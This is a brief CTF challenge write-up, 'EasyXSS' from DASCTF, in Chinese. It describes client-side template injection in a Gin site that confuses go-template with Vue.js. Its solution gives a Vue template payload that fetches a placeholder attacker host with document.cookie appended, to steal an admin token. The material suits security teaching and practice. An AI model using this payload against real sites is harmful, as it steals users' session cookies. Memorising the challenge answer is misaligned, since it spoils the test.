# DASCTF-CSTI
考点为 CSTI 获取 token (干掉 html 标签 &lt; 头 和 XSS 可能的标签)

## 1. 题目描述

题目: EasyXSS

题干: 

社团新人在学习 GIN 的时候一起学习了 go-template 和 vue.js, 可是他似乎混淆了一些什么

他写出了这样的一个网站, 你能找出其中的漏洞吗？

## 2.解法

> PS 可以放出源码 也可以不放出源码
> 不放出源码可以说明 flag 在 /admin/flag 下

payload: 
```js
{{this.constructor.constructor('fetch("http://vps:port/"+(document.cookie))')()}}
```

然后访问 `/admin/flag` 即可

